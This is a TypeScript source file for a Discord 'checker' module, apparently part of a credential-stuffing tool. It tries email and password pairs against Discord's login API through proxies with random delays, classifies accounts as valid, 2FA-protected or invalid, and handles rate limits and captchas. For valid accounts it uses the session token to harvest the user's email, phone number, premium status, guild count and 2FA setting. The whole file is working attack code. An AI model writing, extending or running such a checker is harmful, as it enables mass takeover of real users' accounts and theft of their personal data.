import { BaseChecker } from './base';
import { CheckResult } from '@/types';
import { config } from '@/lib/config';

export class DiscordChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('discord', proxy, timeout);
  }

  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Apply random delay if enabled
      await this.applyRandomDelay();
      
      this.log('info', `Starting check for ${email}`);

      // Get Discord login page first to get necessary cookies and tokens
      const loginPageResponse = await this.client.get('https://discord.com/login');
      
      // Extract cookies from the response
      const cookies = loginPageResponse.headers['set-cookie'] || [];
      const cookieString = cookies.map(cookie => cookie.split(';')[0]).join('; ');

      // Discord login endpoint
      const loginResponse = await this.client.post(
        'https://discord.com/api/v9/auth/login',
        {
          login: email,
          password: password,
          undelete: false,
          login_source: null,
          gift_code_sku_id: null,
        },
        {
          headers: {
            'Content-Type': 'application/json',
            'Cookie': cookieString,
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://discord.com/login',
            'Origin': 'https://discord.com',
          },
        }
      );

      const data = loginResponse.data;

      if (data?.token) {
        this.log('info', `Valid credentials for ${email}`);
        
        // Get account details
        const capture = await this.getAccountDetails(data.token);
        
        return this.createResult(email, password, 'discord', 'valid', capture);
      }

      if (data?.mfa || data?.sms || data?.ticket) {
        this.log('info', `2FA required for ${email}`);
        
        return this.createResult(email, password, 'discord', 'valid', {
          twoFactorEnabled: true,
          requiresVerification: true,
        });
      }

      // Check for specific error messages
      if (data?.message) {
        if (data.message.includes('Invalid') || data.message.includes('password')) {
          this.log('info', `Invalid credentials for ${email}`);
          return this.createResult(email, password, 'discord', 'invalid');
        }
      }

      return this.createResult(email, password, 'discord', 'invalid');
    } catch (error: any) {
      const status = error.response?.status;
      const responseText = error.response?.data || '';

      this.log('warn', `Error checking ${email}:`, error.message);

      // Handle rate limiting
      if (status === 429) {
        const rateLimit = this.detectRateLimit(status, error.response.headers);
        if (rateLimit.isRateLimit) {
          this.log('warn', `Rate limited for ${email}, waiting ${rateLimit.retryAfter}s`);
          await this.sleep((rateLimit.retryAfter || 60) * 1000);
          return this.createResult(
            email,
            password,
            'discord',
            'error',
            undefined,
            `Rate limited. Retry after ${rateLimit.retryAfter}s`
          );
        }
      }

      // Handle captcha
      if (this.detectCaptcha(JSON.stringify(responseText))) {
        this.log('warn', `Captcha required for ${email}`);
        return this.createResult(
          email,
          password,
          'discord',
          'error',
          undefined,
          'Captcha required'
        );
      }

      return this.createResult(
        email,
        password,
        'discord',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(token: string) {
    try {
      const [userResponse, guildsResponse] = await Promise.allSettled([
        this.client.get('https://discord.com/api/v9/users/@me', {
          headers: { Authorization: token },
        }),
        this.client.get('https://discord.com/api/v9/users/@me/guilds', {
          headers: { Authorization: token },
        }),
      ]);

      const userData = userResponse.status === 'fulfilled' ? userResponse.value.data : null;
      const guildsData = guildsResponse.status === 'fulfilled' ? guildsResponse.value.data : [];

      if (!userData) return {};

      return {
        username: userData.username,
        displayName: userData.global_name || userData.username,
        email: userData.email,
        emailVerified: userData.verified,
        phoneNumber: userData.phone,
        createdDate: userData.id 
          ? new Date((parseInt(userData.id) / 4194304) + 1420070400000).toISOString()
          : undefined,
        isPremium: userData.premium_type > 0,
        premiumType: userData.premium_type,
        guilds: Array.isArray(guildsData) ? guildsData.length : 0,
        twoFactorEnabled: userData.mfa_enabled,
        locale: userData.locale,
      };
    } catch {
      return {};
    }
  }
}
